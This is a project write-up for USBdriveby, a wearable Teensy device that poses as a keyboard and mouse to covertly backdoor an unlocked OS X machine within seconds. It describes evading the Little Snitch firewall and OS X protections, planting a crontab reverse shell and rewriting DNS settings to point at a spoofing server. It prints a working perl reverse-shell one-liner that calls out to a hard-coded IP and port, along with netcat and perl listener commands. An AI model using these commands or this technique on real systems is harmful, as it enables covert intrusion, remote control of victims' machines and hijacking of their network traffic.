# [USBdriveby](http://samy.pl/usbdriveby)

**USBdriveby** is a device you stylishly wear around your neck which can quickly and covertly install a backdoor and override DNS settings on an unlocked machine via USB in a matter of seconds. It does this by emulating a keyboard and mouse, blindly typing controlled commands, flailing the mouse pointer around and weaponizing mouse clicks.

In this project, we'll learn how to exploit a system's blind trust in USB devices, and learn how a $20 Teensy microcontroller can evade various security settings on a real system, open a permanent backdoor, disable a firewall, control the flow of network traffic, and all within a few seconds and permanently, even after the device has been removed.

by [@SamyKamkar](https://twitter.com/samykamkar) // <code@samy.pl> // <http://samy.pl> // Dec 17, 2014

Code available on [github](https://github.com/samyk/usbdriveby)

<a href="http://www.youtube.com/watch?feature=player_embedded&v=4aRw0FYdf_4
" target="_blank"><img src="http://img.youtube.com/vi/4aRw0FYdf_4/0.jpg" alt="USBdriveby" width="640" height="480" border="10" /></a>

------

# Overview

I often wear a microcontroller around my neck, and have a few for a various fun tasks. One that's more interesting is this, USBdriveby, which emulates a keyboard and mouse when plugged into a machine, exploiting the blind trust machines give USB devices.

Specifically, when you normally plug in a mouse or keyboard into a machine, no authorization is required to begin using them. The devices can simply begin typing and clicking. We exploit this fact by sending arbitrary keystrokes meant to launch specific applications (via Spotlight/Alfred/Quicksilver), permanently evade a local firewall (Little Snitch), install a reverse shell in crontab, and even modify DNS settings without any additional permissions.

While this example is on OS X, it is easily extendable to Windows and *nix.

We even evade OS X's security - while they attempt to prevent network changes being done by just a "keyboard", and even prevent most applications from changing position (special authorized accessibility features must be enabled which we don't have authorization for), we evade both of these with some unprotected applescript and carefully planned mouse movements.

![http://samy.pl/usbdriveby/driveby.jpg](http://samy.pl/usbdriveby/driveby.jpg)

If you haven't checked out [BadUSB](https://srlabs.de/badusb/), please do. The awesome [Karsten Nohl](http://www.cs.virginia.edu/~kn5f/) and the srlabs team have developed some much more advanced methods of USB pwnage and have demonstrated this, though they have not released any code.                                                              


------

# Software

### USBdriveby
You can acquire the USBdriveby microcontroller source code from my github: <https://github.com/samyk/usbdriveby>

I've written it for both Teensy and Arduino microcontrollers, however not all Arduinos are capable of emulating a USB HID keyboard/mouse (the Arduino Nano specifically cannot).

### dns_spoofer.pl
I've created a DNS server which responds to normal DNS requests properly, however sends spoofed answers for specific hostnames. This runs on a remote host and allows us to manipulate the traffic of the system that's been hit by USBdriveby.

This is also available on my github: <https://github.com/samyk/usbdriveby>

### Net::DNS
My DNS spoofer depends on the [Net::DNS](http://www.net-dns.org/) suite of perl modules.

### perl backdoor
We use a perl backdoor I developed as virtually all OS X and *nix machines have perl installed by default. You'll find many of these systems don't come with a C compiler, especially in the bare bones version, but perl is always quietly available.

``perl -MIO::Socket -e'$c=new IO::Socket::INET("72.14.179.47:1337");print$c `$_`while<$c>'``

### netcat
To evade the local router and not require any ports opening up, we produce a reverse shell by connecting out to a server we control every 5 minutes via crontab, and once the connection is established, we can begin sending commands to the compromised machine. If the connection dies, the compromised system will connect back within 5 minutes. [netcat](http://netcat.sourceforge.net/) is an easy way to support this.

`netcat -l 1337`

You could also use perl in lieu of netcat again:

``perl -MIO -e'$c=new IO::Socket::INET(LocalPort,1337,Listen)->accept;print$c $_ while <STDIN>'``

-----

# Hardware

### Teensy
**$20**: [Teensy 3.1](https://www.pjrc.com/teensy/) is an awesome USB based microcontroller. It's small, more powerful than typical Arduinos, and inexpensive. It's perfect for this project with it's small form factor, support for emulating USB devices such as HID keyboards and mice, and it looks rad.

### Chain
Get a cool chain so you can wear your USBdriveby device around as a pendant. You'll get compliments on your jewelry, but little do they know...


-----

# Emulating HID Devices

I go into the code and emulating devices in the video!

-----

# Custom DNS Server

I developed a simple DNS server which actually answers requests properly except in the case of specific hosts we wish to spoof. We can spoof them in the code or simply add them to /etc/hosts as my software spoofs anything in /etc/hosts as well.

-----

# Questions?

Feel free to contact me with any questions!

Follow [@SamyKamkar](https://twitter.com/samykamkar) on Twitter!

You can see more of my projects at <http://samy.pl> or contact me at <code@samy.pl>.


------
